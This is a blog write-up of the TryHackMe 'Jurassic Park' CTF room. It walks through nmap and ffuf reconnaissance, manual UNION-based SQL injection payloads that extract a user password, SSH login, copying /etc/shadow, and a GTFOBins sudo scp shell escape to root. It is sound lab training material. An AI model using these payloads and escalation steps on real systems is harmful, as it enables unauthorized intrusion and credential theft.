---
title: "Jurassic Park"
date: 2024-01-08
draft: false
summary: "Writeup for Jurassic Park CTF challenge on TryHackMe."
tags: ["linux", "sqli", "sudo"]
categories: ["writeups"]
series: []
showToc: true
cover:
  image: "https://cdn.ziomsec.com/jurassic-park/cover.webp"
  caption: "Jurassic Park TryHackMe Challenge"
  alt: "Jurassic Park cover"
platform: "TryHackMe"
---

A Jurassic Park CTF
<!--more-->
To access the machine, click on the link given below:
- https://tryhackme.com/room/jurassicpark

## Reconnaissance

I performed an **nmap** aggressive scan to find open ports, service info and script scan results on the target.

```shell
nmap -A -p- TARGET --min-rate 10000 -oN jurassic.nmap
```

![](https://cdn.ziomsec.com/jurassic-park/1.webp)

The target had only 2 ports open:
- Port 80 : http
- Port 22 : ssh

## Initial Foothold

I accessed the web application through my browser.

![](https://cdn.ziomsec.com/jurassic-park/2.webp)

I clicked on the *online shop* and was given an option to select a package.

![](https://cdn.ziomsec.com/jurassic-park/3.webp)

I clicked on a package and noticed that the package details were being fetched using the **`id`** parameter. I tried adding a **`'`** to see how the application responded.

![](https://cdn.ziomsec.com/jurassic-park/4.webp)

It instantly triggered an error.

![](https://cdn.ziomsec.com/jurassic-park/5.webp)

Scrolling to the bottom of the page revealed a challenge asking us to try `SqlMap`

I then fuzzed for files in the web application and found *robots.txt* that could contain path to interesting endpoints.

```shell
ffuf -u http://TARGET/FUZZ -w /usr/share/wrodlists/seclists/Discovery/Web-Content/raft-large-files.txt -fc 403
```

![](https://cdn.ziomsec.com/jurassic-park/6.webp)

However, there was nothing in it. The only page left to inspect now was the *item.php* where an error was thrown upon sending a **`'`** in the **`id`** parameter. I viewed the source code and found that the target was running **MySQL** database.

![](https://cdn.ziomsec.com/jurassic-park/7.webp)

Since, I was dared to use **sqlmap**, I tried using it. However, it was taking a long time and wasn't giving the expected results.

```shell
sqlmap -u http://TARGET/item.php?id=1' --dbs --tables --columns --schema --dump-all --dbms=mysql
```

![](https://cdn.ziomsec.com/jurassic-park/8.webp)

Hence, I switched to manual testing. I captured the request made for the package on **Burp Suite** and sent it to **Repeater**. Since **`'`** was causing an error, I added a true statement directly after the **id** value. 

The payload that I used:
```
+OR+1=1
```

There was a visible change in the response of the web app.

![](https://cdn.ziomsec.com/jurassic-park/9.webp)

When I sent a false statement, no results were found.

```
+AND+1=2
```

I then had to find the number of columns. I used **`ORDER BY`** query for the same.

```
+ORDER+BY+1
```

When I tried sorting the result based on column number 6, I received an error. Hence, I could conclude that the table being used had 5 columns.

```
+ORDER+BY+6
```

![](https://cdn.ziomsec.com/jurassic-park/10.webp)

I then used **`UNION`** to find columns that were returned to us on the web page.

```
UNION+SELECT+1,2,3,4,5
```

![](https://cdn.ziomsec.com/jurassic-park/11.webp)

My usual methods did not work and were being blocked so I searched online to see if there was any another way. 

I used the below query to find the name of the current database.

```
+UNION+SELECT+1,DATABASE(),3,4,5
```

![](https://cdn.ziomsec.com/jurassic-park/12.webp)

I then used the below query to find the version of the server

```
+UNION+SELECT+1,version(),3,4,5
```

![](https://cdn.ziomsec.com/jurassic-park/13.webp)

I queried the table name from the current database.

```
UNION+SELECT+1,table_name+3,4,5+FROM+information_schema.tables+WHERE+table_schema=database()
```

![](https://cdn.ziomsec.com/jurassic-park/14.webp)

Then I queried the column name for the *users* table.

```
UNION+SELECT+1,column_name,3,4,5+FROM+information_schema.columns+WHERE+table_name="users"+AND+table_schema=database()
```

![](https://cdn.ziomsec.com/jurassic-park/15.webp)

I then extracted password from the table.

```
UNION+SELECT+1,password,3,password,5+FROM+users
```

![](https://cdn.ziomsec.com/jurassic-park/16.webp)

I found a password. The question on **Tryhackme** already provided a username called **Dennis**. I tried the username and password against **ssh** and changed the letter case of the username...

```shell
ssh dennis@TARGET
```

Finally, I captured first flag.

![](https://cdn.ziomsec.com/jurassic-park/17.webp)

## Privilege Escalation

I then looked at my **sudo** privileges and found that I was allowed to run **scp** as root.

```shell
sudo -l
```

![](https://cdn.ziomsec.com/jurassic-park/18.webp)

My directory also contained a *bash_history* file which would contain a log of commands entered on the terminal.

Viewing the *bash_history* file revealed the third flag. I also got a hint of the location of the fifth flag.

```shell
cat .bash_history
```

![](https://cdn.ziomsec.com/jurassic-park/19.webp)

I also viewed the shadow file but didn't find the root hash.

```shell
scp /etc/shadow dennis@TARGET:/home/dennis/shadow
```

![](https://cdn.ziomsec.com/jurassic-park/20.webp)

I then visited **GTFOBins** and found a way to exploit the **sudo** privileges on **scp**.
- https://gtfobins.github.io/gtfobins/scp/#sudo

```shell
TF=$(mktemp)
echo 'sh 0<&2 1>&2' > $TF
chmod +x "$TF"
sudo scp -S $TF x y:
```

I followed the method shown on the website and spawned a shell as root.

![](https://cdn.ziomsec.com/jurassic-park/21.webp)

I captured the fifth flag from */root* directory.

```shell
cat /root/flag5.txt
```

![](https://cdn.ziomsec.com/jurassic-park/22.webp)

Since, I had root access, I used the **find** command to search for the second flag.

```shell
find / -type f -iname '*flag*' 2>/dev/null
```

![](https://cdn.ziomsec.com/jurassic-park/23.webp)

I also found the location of the second flag inside *ubuntu* user's bash history file.

```shell
cat /home/ubuntu/.bash_history
```

![](https://cdn.ziomsec.com/jurassic-park/24.webp)

I then captured flag two.

```shell
cat /boot/grub/fonts/flagTwo.txt
```

![](https://cdn.ziomsec.com/jurassic-park/25.webp)

> PS: There is no flag 4.

That's it from my side!
Until next time:)

---
